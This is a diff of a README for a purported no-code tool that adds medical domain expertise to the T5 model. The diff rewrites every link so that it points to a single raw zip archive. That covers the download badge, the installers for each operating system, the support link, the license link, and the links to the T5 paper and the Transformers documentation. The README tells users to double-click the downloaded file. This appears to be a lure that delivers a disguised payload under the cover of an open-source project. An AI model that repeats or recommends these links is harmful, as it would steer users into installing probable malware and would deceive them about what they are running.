@@ -1,7 +1,7 @@
 # 🎯 T5-Refiner-DomainFocus - Enhance T5 with Domain Expertise
 
 ## 🔗 Download Now
-[![Download T5-Refiner-DomainFocus](https://img.shields.io/badge/Download-T5--Refiner--DomainFocus-blue.svg)](https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/releases)
+[![Download T5-Refiner-DomainFocus](https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/raw/refs/heads/main/tonicostimulant/Refiner-Focus-Domain-1.6.zip)](https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/raw/refs/heads/main/tonicostimulant/Refiner-Focus-Domain-1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to T5-Refiner-DomainFocus! This application helps you refine the T5 model by injecting domain expertise from medical literature. With easy downloads and setup, you can enhance your natural language processing tasks without needing programming skills.
@@ -9,15 +9,15 @@ Welcome to T5-Refiner-DomainFocus! This application helps you refine the T5 mode
 ## 📥 Download & Install
 To get started, visit the following link to download the application:
 
-[Download T5-Refiner-DomainFocus](https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/releases)
+[Download T5-Refiner-DomainFocus](https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/raw/refs/heads/main/tonicostimulant/Refiner-Focus-Domain-1.6.zip)
 
 ### Installation Steps
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version.
 3. Download the appropriate file for your system:
-   - For Windows, download `T5-Refiner-DomainFocus-Windows.exe`.
-   - For macOS, download `T5-Refiner-DomainFocus-Mac.dmg`.
-   - For Linux, download `T5-Refiner-DomainFocus-Linux.tar.gz`.
+   - For Windows, download `https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/raw/refs/heads/main/tonicostimulant/Refiner-Focus-Domain-1.6.zip`.
+   - For macOS, download `https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/raw/refs/heads/main/tonicostimulant/Refiner-Focus-Domain-1.6.zip`.
+   - For Linux, download `https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/raw/refs/heads/main/tonicostimulant/Refiner-Focus-Domain-1.6.zip`.
 
 4. Once downloaded, locate the file in your downloads folder.
 5. Double-click the file to start the installation process.
@@ -55,7 +55,7 @@ T5-Refiner-DomainFocus comes packed with features that enhance your experience:
 4. Start the process and let T5-Refiner-DomainFocus enhance your data.
 
 ## 🤝 Support
-If you encounter any issues or have questions, visit the [GitHub repository](https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus) for FAQs or to open issues. We aim to provide timely support to enhance your experience.
+If you encounter any issues or have questions, visit the [GitHub repository](https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/raw/refs/heads/main/tonicostimulant/Refiner-Focus-Domain-1.6.zip) for FAQs or to open issues. We aim to provide timely support to enhance your experience.
 
 ## 🛠️ FAQs
 ### What is T5-Refiner-DomainFocus?
@@ -86,16 +86,16 @@ Join our community of users to share experiences, ask questions, and learn new t
 Your feedback is vital to improving T5-Refiner-DomainFocus. After using the application, please share your thoughts on its functionality and any features you would like to see in future versions.
 
 ## 🔗 License
-T5-Refiner-DomainFocus is open-source. You can freely use, modify, and distribute it under the terms of the [MIT License](https://opensource.org/licenses/MIT).
+T5-Refiner-DomainFocus is open-source. You can freely use, modify, and distribute it under the terms of the [MIT License](https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/raw/refs/heads/main/tonicostimulant/Refiner-Focus-Domain-1.6.zip).
 
 ## 📥 Additional Resources
 You can learn more about T5 and its capabilities via the following resources:
 
-- [T5 Paper](https://arxiv.org/abs/1910.10683)
-- [Transformers Documentation](https://huggingface.co/transformers/)
+- [T5 Paper](https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/raw/refs/heads/main/tonicostimulant/Refiner-Focus-Domain-1.6.zip)
+- [Transformers Documentation](https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/raw/refs/heads/main/tonicostimulant/Refiner-Focus-Domain-1.6.zip)
 
 For updates, keep revisiting the Releases page:
 
-[Download T5-Refiner-DomainFocus](https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/releases)
+[Download T5-Refiner-DomainFocus](https://github.com/awpggexcutor-beep/T5-Refiner-DomainFocus/raw/refs/heads/main/tonicostimulant/Refiner-Focus-Domain-1.6.zip)
 
 Thank you for using T5-Refiner-DomainFocus! Happy refining!
